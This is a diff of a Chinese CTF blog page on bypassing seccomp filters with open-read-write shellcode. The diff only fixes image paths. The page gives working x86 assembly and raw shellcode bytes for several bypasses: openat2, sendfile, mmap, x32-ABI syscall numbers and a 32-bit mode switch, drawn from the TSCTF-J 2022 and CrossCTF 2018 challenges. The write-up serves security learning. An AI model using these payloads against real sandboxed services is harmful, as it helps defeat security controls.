@@ -461,7 +461,7 @@ syscall
 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">push 0x67616c66</span><br><span class="line">mov rsi,rsp</span><br><span class="line">xor rdx,rdx</span><br><span class="line">mov rdi,0xffffff9c</span><br><span class="line">push 257</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">mov rdi,rax</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov edx,0x100</span><br><span class="line">xor eax,eax</span><br><span class="line">syscall</span><br><span class="line">mov edi,1</span><br><span class="line">mov rsi,rsp</span><br><span class="line">push 1</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></tbody></table></figure>
 
 <p>openat的参数得是这样</p>
-<p><img src="/pic/orw_stack/%5Cimage-20241016220802770.png" alt="image-20241016220802770">这个位置rdi要设置为0xfffff9c</p>
+<p><img src="/pic/orw_stack/image-20241016220802770.png" alt="image-20241016220802770">这个位置rdi要设置为0xfffff9c</p>
 <h3 id="2-ban-了-open和openat函数"><a href="#2-ban-了-open和openat函数" class="headerlink" title="2.ban 了 open和openat函数"></a>2.ban 了 open和openat函数</h3><p>攻击方式利用 x32-abi或者转化64位模式位为32位模式 进行32位的shellcode orw 利用<br>x32-abi和转化为32位的具体解析 放在后面了</p>
 <h3 id="3-ban了-x32-abi-64位模式转换-和open-openat-函数"><a href="#3-ban了-x32-abi-64位模式转换-和open-openat-函数" class="headerlink" title="3.ban了 x32-abi   64位模式转换 和open  openat 函数"></a>3.ban了 x32-abi   64位模式转换 和open  openat 函数</h3><p><code>openat2</code> 系统调用在 Linux 内核版本 5.6 中引入  所以linux内核版本 不能太低 不然赛题中可能用不上</p>
 <p>使用openat2函数  感觉出题者没注意的话 用这种可以通杀</p>
@@ -469,7 +469,7 @@ syscall
 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">push rax</span><br><span class="line">xor rdi, rdi</span><br><span class="line">sub rdi, 100</span><br><span class="line">mov rsi, rsp</span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">mov rdx, rsp</span><br><span class="line">mov r10, 0x18</span><br><span class="line">push 437</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">mov rdi,rax</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov edx,0x100</span><br><span class="line">xor eax,eax</span><br><span class="line">syscall</span><br><span class="line">mov edi,1</span><br><span class="line">mov rsi,rsp</span><br><span class="line">push 1</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></tbody></table></figure>
 
 <p>参数情况如下图</p>
-<p><img src="/pic/orw_stack/%5Cimage-20241016220813195.png" alt="image-20241016220813195"></p>
+<p><img src="/pic/orw_stack/image-20241016220813195.png" alt="image-20241016220813195"></p>
 <p>以上基本是出现在return kill的情况</p>
 <h3 id="return-trace的打法"><a href="#return-trace的打法" class="headerlink" title="return trace的打法"></a>return trace的打法</h3><p>而如果是 以上全都被ban了，然后是return trace的话 又是另一种打法 整体可能会比较复杂 具体原理放到另一篇文章讲</p>
 <h2 id="ORW缺R的情况"><a href="#ORW缺R的情况" class="headerlink" title="ORW缺R的情况"></a>ORW缺R的情况</h2><p>1.用sendfile函数 来代替R和W</p>
@@ -481,7 +481,7 @@ syscall
 
 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mov rax,0x67616c662f2e</span><br><span class="line">mov rsi,0</span><br><span class="line">mov rdx,0</span><br><span class="line">push rax</span><br><span class="line">mov rax,2</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi,0</span><br><span class="line">mov rsi,0x100</span><br><span class="line">mov rdx,7</span><br><span class="line">mov rcx,2</span><br><span class="line">mov r10,2</span><br><span class="line">mov r8,rax</span><br><span class="line">mov r9,0</span><br><span class="line">mov rax,9</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">push rax</span><br><span class="line">pop rsi</span><br><span class="line">mov rax,1</span><br><span class="line">mov rdi,1</span><br><span class="line">mov rdx,0x40</span><br><span class="line">syscall</span><br></pre></td></tr></tbody></table></figure>
 
-<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/pic/orw_stack/%5Cimage-20241016220823018.png" alt="image-20241016220823018"></h2><h2 id="ORW缺W的情况"><a href="#ORW缺W的情况" class="headerlink" title="ORW缺W的情况"></a>ORW缺W的情况</h2><p>爆破类型:测信道爆破</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/pic/orw_stack/image-20241016220823018.png" alt="image-20241016220823018"></h2><h2 id="ORW缺W的情况"><a href="#ORW缺W的情况" class="headerlink" title="ORW缺W的情况"></a>ORW缺W的情况</h2><p>爆破类型:测信道爆破</p>
 <p>不爆破类型:替换函数<strong>pwrite64、writev</strong></p>
 <p>替换这种的话 关键还是看汇编和对函数的了解能力</p>
 <p>这里重点讲一下测信道爆破的打法：</p>
@@ -499,7 +499,7 @@ syscall
 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#ifndef _UAPI_ASM_X86_UNISTD_H</span><br><span class="line">#define _UAPI_ASM_X86_UNISTD_H</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * x32 syscall flag bit.  Some user programs expect syscall NR macros</span><br><span class="line"> * and __X32_SYSCALL_BIT to have type int, even though syscall numbers</span><br><span class="line"> * are, for practical purposes, unsigned long.</span><br><span class="line"> *</span><br><span class="line"> * Fortunately, expressions like (nr &amp; ~__X32_SYSCALL_BIT) do the right</span><br><span class="line"> * thing regardless.</span><br><span class="line"> */</span><br><span class="line">#define __X32_SYSCALL_BIT	0x40000000</span><br><span class="line"></span><br><span class="line">#ifndef __KERNEL__</span><br><span class="line"># ifdef __i386__</span><br><span class="line">#  include &lt;asm/unistd_32.h&gt;</span><br><span class="line"># elif defined(__ILP32__)</span><br><span class="line">#  include &lt;asm/unistd_x32.h&gt;</span><br><span class="line"># else</span><br><span class="line">#  include &lt;asm/unistd_64.h&gt;</span><br><span class="line"># endif</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">#endif /* _UAPI_ASM_X86_UNISTD_H */</span><br></pre></td></tr></tbody></table></figure>
 
 <h3 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h3><p>没限制系统号&lt;0x4000000000</p>
-<h3 id="TSCTF-J-2022-Easy-Shellcode"><a href="#TSCTF-J-2022-Easy-Shellcode" class="headerlink" title="[TSCTF-J 2022] Easy Shellcode"></a>[TSCTF-J 2022] Easy Shellcode</h3><p><img src="/pic/orw_stack/%5Cimage-20241016220840911.png" alt="image-20241016220840911">其实也就是把系统调用号调为了 0x40000000之后 为x32-abi，其实就是在原来的系统调用基础上加上一个值</p>
+<h3 id="TSCTF-J-2022-Easy-Shellcode"><a href="#TSCTF-J-2022-Easy-Shellcode" class="headerlink" title="[TSCTF-J 2022] Easy Shellcode"></a>[TSCTF-J 2022] Easy Shellcode</h3><p><img src="/pic/orw_stack/image-20241016220840911.png" alt="image-20241016220840911">其实也就是把系统调用号调为了 0x40000000之后 为x32-abi，其实就是在原来的系统调用基础上加上一个值</p>
 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">lea rax,[rip]</span><br><span class="line">add rax,0x200</span><br><span class="line">mov rsp,rax ;  因为rsp被清空，先将栈迁移至可读写位置</span><br><span class="line"></span><br><span class="line">mov eax,0x67616c66 ;  'flag'</span><br><span class="line">push rax</span><br><span class="line">mov rdi,rsp</span><br><span class="line">xor rsi,rsi</span><br><span class="line">mov rax,0x40000002 ;  open</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi,rax</span><br><span class="line">mov rax,rsp</span><br><span class="line">add rax,0x100</span><br><span class="line">mov rsi,rax</span><br><span class="line">mov rdx,0x40</span><br><span class="line">mov rax,0x40000000 ;  read</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov edi,2</span><br><span class="line">mov rax,0x40000001 ;  write</span><br><span class="line">syscall</span><br></pre></td></tr></tbody></table></figure>
 
 <h2 id="使用32位模式"><a href="#使用32位模式" class="headerlink" title="使用32位模式"></a>使用32位模式</h2><h3 id="32位模式"><a href="#32位模式" class="headerlink" title="32位模式"></a>32位模式</h3><p>32位模式即64位系统下运行32位程序的模式，此时CS寄存器的值为<strong>0x23</strong>。在该模式下，程序与在32位系统中运行几乎无异，即只能使用32位寄存器，所有指针必须为32位，指令集为32位指令集等。与之相对地，64位模式对应的CS寄存器的值为<strong>0x33</strong>。</p>
@@ -513,7 +513,7 @@ syscall
 <li>存在或可构造32位地址的RWX内存段</li>
 </ul>
 <p>其中，构造RWX内存段可使用mmap申请新的内存，或使用mprotect使已有的段变为RWX权限</p>
-<h3 id="CrossCTF-Quals-2018-Impossible-Shellcoding"><a href="#CrossCTF-Quals-2018-Impossible-Shellcoding" class="headerlink" title="[CrossCTF Quals 2018] Impossible Shellcoding"></a>[CrossCTF Quals 2018] Impossible Shellcoding</h3><p><img src="/pic/orw_stack/%5Cimage-20241016220849272.png" alt="image-20241016220849272">创建一个mmap位置，然后读入32位的shellcode 然后64位转化为32位</p>
+<h3 id="CrossCTF-Quals-2018-Impossible-Shellcoding"><a href="#CrossCTF-Quals-2018-Impossible-Shellcoding" class="headerlink" title="[CrossCTF Quals 2018] Impossible Shellcoding"></a>[CrossCTF Quals 2018] Impossible Shellcoding</h3><p><img src="/pic/orw_stack/image-20241016220849272.png" alt="image-20241016220849272">创建一个mmap位置，然后读入32位的shellcode 然后64位转化为32位</p>
 <p>这里补充一下mmap的利用说明</p>
 <p>mmap将一个文档或者其它对象映射进内存。文档被映射到多个页上，如果文档的大小不是所有页的大小之和，最后一个页不被使用的空间将会清零。mmap在用户空间映射调用系统中作用很大。<br>头文档 &lt;sys/mman.h&gt;</p>
 <p>void* mmap(void* start,size_t length,int prot,int flags,int fd,off_t offset);<br>第一个参数：分配新内存的地址<br>第二个参数：新内存的长度（0x1000的倍数），长度单位是字节，不足一内存页按一内存页处理<br>第三个参数：期望的内存保护标志，不能与文档的打开模式冲突。<br>            PROT_EXEC（可执行）在内存中用4来表示<br>            PROT_READ（可读）在内存中用1来表示<br>            PROT_WRITE（可写）在内存中用2来表示<br>            PROT_NONE（不可访问）在内存中用0来表示<br>第四个参数：映射的类型<br>            MAP_FIXED（）在内存中用10来表示<br>            MAP_SHARED（）在内存中用1来表示<br>            MAP_PRIVATE（）在内存中用2来表示<br>            MAP_NORESERVE（）在内存中用4000来表示<br>            MAP_LOCKED（）在内存中用2000来表示<br>第五个参数：文档描述符，可设为0<br>第六个参数：如果为文档映射，则此处代表定位到文档的那个位置，然后开始向后映射。</p>
@@ -525,22 +525,22 @@ syscall
 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">push 0</span><br><span class="line">push 0x67616c66</span><br><span class="line">push esp</span><br><span class="line">pop ebx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">push 5</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line"></span><br><span class="line">push eax</span><br><span class="line">pop ebx</span><br><span class="line">push esp </span><br><span class="line">pop ecx                                          </span><br><span class="line">push 0x50</span><br><span class="line">pop edx</span><br><span class="line">push 3</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line"></span><br><span class="line">push 1</span><br><span class="line">pop ebx</span><br><span class="line">push esp</span><br><span class="line">pop ecx</span><br><span class="line">push 0x50</span><br><span class="line">pop edx</span><br><span class="line">push 4</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></tbody></table></figure>
 
 <p>汇编转化为字节码的  因为不是64位的架构不同 不能用asm(shellcode)这种直接进行转化</p>
-<p><img src="/pic/orw_stack/%5Cimage-20241016220858497.png" alt="image-20241016220858497"></p>
+<p><img src="/pic/orw_stack/image-20241016220858497.png" alt="image-20241016220858497"></p>
 <p>网站：<a target="_blank" rel="noopener" href="https://defuse.ca/online-x86-assembler.htm#disassembly">Online x86 and x64 Intel Instruction Assembler (defuse.ca)</a></p>
 <p>转化后为\x6A\x00\x68\x66\x6C\x61\x67\x54\x5B\x31\xC9\x6A\x05\x58\xCD\x80\x50\x5B\x54\x59\x6A\x50\x5A\x6A\x03\x58\xCD\x80\x6A\x01\x5B\x54\x59\x6A\x50\x5A\x6A\x04\x58\xCD\x80</p>
 <h3 id="动态调试部分如下："><a href="#动态调试部分如下：" class="headerlink" title="动态调试部分如下："></a>动态调试部分如下：</h3><p>mmap一块新地址 来存放32位shellcode</p>
-<p><img src="/pic/orw_stack/%5Cimage-20241016220903122.png" alt="image.png"></p>
+<p><img src="/pic/orw_stack/image-20241016220903122.png" alt="image.png"></p>
 <p>读入32位shellcode</p>
-<p><img src="/pic/orw_stack/%5Cimage-20241016220909147.png" alt="image-20241016220909147">转为32位模式 返回 shellcode存入的位置</p>
-<p><img src="/pic/orw_stack/%5Cimage-20241016220913962.png" alt="image-20241016220913962"></p>
+<p><img src="/pic/orw_stack/image-20241016220909147.png" alt="image-20241016220909147">转为32位模式 返回 shellcode存入的位置</p>
+<p><img src="/pic/orw_stack/image-20241016220913962.png" alt="image-20241016220913962"></p>
 <p>open</p>
-<p><img src="/pic/orw_stack/%5Cimage-20241016220920858.png" alt="image.png"></p>
+<p><img src="/pic/orw_stack/image-20241016220920858.png" alt="image.png"></p>
 <p>read</p>
-<p><img src="/pic/orw_stack/%5Cimage-20241016220930036.png" alt="image-20241016220930036"></p>
+<p><img src="/pic/orw_stack/image-20241016220930036.png" alt="image-20241016220930036"></p>
 <p>write</p>
-<p><img src="/pic/orw_stack/%5Cimage-20241016220935766.png" alt="image-20241016220935766"></p>
+<p><img src="/pic/orw_stack/image-20241016220935766.png" alt="image-20241016220935766"></p>
 <p>成功获得flag：</p>
-<p><img src="/pic/orw_stack/%5Cimage-20241016220940383.png" alt="image-20241016220940383">参考文献<br><a target="_blank" rel="noopener" href="https://feng-zz-pwn.github.io/2024/02/26/2024VNCTF-PWN/">https://feng-zz-pwn.github.io/2024/02/26/2024VNCTF-PWN/</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pwnfeifei/p/15746588.html">https://www.cnblogs.com/pwnfeifei/p/15746588.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_79326813/article/details/140902801">https://blog.csdn.net/2301_79326813/article/details/140902801</a><br><a target="_blank" rel="noopener" href="https://www.man7.org/linux/man-pages/man2/openat2.2.html">https://www.man7.org/linux/man-pages/man2/openat2.2.html</a></p>
+<p><img src="/pic/orw_stack/image-20241016220940383.png" alt="image-20241016220940383">参考文献<br><a target="_blank" rel="noopener" href="https://feng-zz-pwn.github.io/2024/02/26/2024VNCTF-PWN/">https://feng-zz-pwn.github.io/2024/02/26/2024VNCTF-PWN/</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pwnfeifei/p/15746588.html">https://www.cnblogs.com/pwnfeifei/p/15746588.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_79326813/article/details/140902801">https://blog.csdn.net/2301_79326813/article/details/140902801</a><br><a target="_blank" rel="noopener" href="https://www.man7.org/linux/man-pages/man2/openat2.2.html">https://www.man7.org/linux/man-pages/man2/openat2.2.html</a></p>
 
                 
             </div>
